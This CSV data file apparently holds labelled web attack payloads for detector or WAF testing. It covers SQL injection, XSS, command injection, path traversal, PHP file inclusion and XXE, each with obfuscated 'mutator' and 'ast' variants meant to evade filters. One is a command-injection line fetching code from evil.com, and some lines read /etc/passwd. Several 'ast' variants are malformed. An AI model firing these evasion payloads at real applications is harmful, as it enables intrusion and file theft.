payload,label,source
"1 union select 1,2--",SQLi,original
"1 uNIOn SEleCT 1,2--",SQLi,mutator
"1 unIOn seLECt 1,2--",SQLi,mutator
"1 uNION SElECT 1,2--",SQLi,mutator
"1 UNION sELECT 1,2--",SQLi,mutator
"1 uNIOn seLecT 1,2--",SQLi,mutator
"1/**/union/**/select/**/1,2--",SQLi,mutator
"1 uNiON SElECT 1,2--",SQLi,mutator
"1 UniON sELect 1,2--",SQLi,mutator
1%20union%20select%201%2C2--,SQLi,mutator
"1 uni'+'on select 1,2--",SQLi,mutator
"1 union select 1,2--",SQLi,ast
"String.fromCharCode(49,32,117,110,105,111,110,32,115,101,108,101,99,116,32,49,44,50,45,45)",SQLi,ast
"1 u'+'n'+'i'+'o'+'n s'+'e'+'l'+'e'+'c'+'t 1,2--",SQLi,ast
"1/**/union/**/select/**/1,2--",SQLi,ast
<script>alert(1)</script>,XSS,original
"<img src=x onerror=""<script>alert(1)</script>"">",XSS,mutator
<script>alert(1)</script>,XSS,mutator
&#60;&#115;cri&#112;t>aler&#116;(&#49;)<&#47;&#115;&#99;&#114;&#105;pt>,XSS,mutator
<sc&#114;&#105;p&#116;&#62;&#97;&#108;ert(&#49;)</s&#99;rip&#116;>,XSS,mutator
<&#115;cri&#112;t>&#97;&#108;er&#116;(1&#41;</s&#99;r&#105;p&#116;>,XSS,mutator
&#60;&#115;&#99;ri&#112;&#116;&#62;&#97;&#108;e&#114;t&#40;&#49;)</sc&#114;&#105;p&#116;>,XSS,mutator
<scrip&#116;>&#97;&#108;er&#116;(1&#41;</&#115;&#99;ript>,XSS,mutator
<svg/onload=<script>alert(1)</script>>,XSS,mutator
&#60;sc&#114;&#105;&#112;&#116;>a&#108;ert&#40;&#49;)&#60;&#47;sc&#114;ipt>,XSS,mutator
<scr&#105;&#112;t&#62;aler&#116;&#40;1&#41;</sc&#114;&#105;&#112;&#116;>,XSS,mutator
eval(atob('<script>alert(1)</script>')),XSS,ast
<script>alert(1)</script>,XSS,ast
"String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99)",XSS,ast
;wget http://evil.com/x,CMD,original
;wgEt http://EvIL.COm/x,CMD,mutator
;WGeT hTtp://eVIL.coM/X,CMD,mutator
;wget/**/http://evil.com/x,CMD,mutator
;wget http://evil.com/x,CMD,mutator
;wGEt Http://EvIL.Com/x,CMD,mutator
;WGEt HTtP://eViL.Com/X,CMD,mutator
"String.fromCharCode(59,119,103,101,116,32,104,116,116,112,58,47,47,101,118,105,108,46,99,111)",CMD,ast
;wget/**/http://evil.com/x,CMD,ast
;wget http://evil.com/x,CMD,ast
../../../etc/passwd,PathTraversal,original
../../../eTC/paSswd,PathTraversal,mutator
../../../eTC/PaSSWD,PathTraversal,mutator
../../../etc/passwd,PathTraversal,mutator
../../../ETc/Passwd,PathTraversal,mutator
..%2F..%2F..%2Fetc%2Fpasswd,PathTraversal,mutator
../../../ETC/PAsSWd,PathTraversal,mutator
"String.fromCharCode(46,46,47,46,46,47,46,46,47,101,116,99,47,112,97,115,115,119,100)",PathTraversal,ast
../../../etc/passwd,PathTraversal,ast
php://filter/convert.base64-encode/resource=index.php,FileInclusion,original
PhP://FiLTER/conVert.BASe64-eNcOde/REsOUrcE=INDeX.PhP,FileInclusion,mutator
php://filter/convert.base64-encode/resource=index.php,FileInclusion,mutator
php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex.php,FileInclusion,mutator
PHP://filteR/cONvERT.BAsE64-encODe/RESOurce=inDEX.PHp,FileInclusion,mutator
php://filter/convert.base64-encode/resource=index.php,FileInclusion,ast
"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",XXE,original
"<!eNTIty Xxe sYStem ""fIlE:///ETc/PASSwD"">",XXE,mutator
"<!eNTItY xxe sySteM ""FILE:///Etc/pAsSWd"">",XXE,mutator
"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",XXE,mutator
"<!ENtiTy XXE SyStEM ""FiLE:///eTc/pASSWD"">",XXE,mutator
"<!EnTitY Xxe syStEm ""fIle:///eTC/pASsWD"">",XXE,mutator
%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E,XXE,mutator
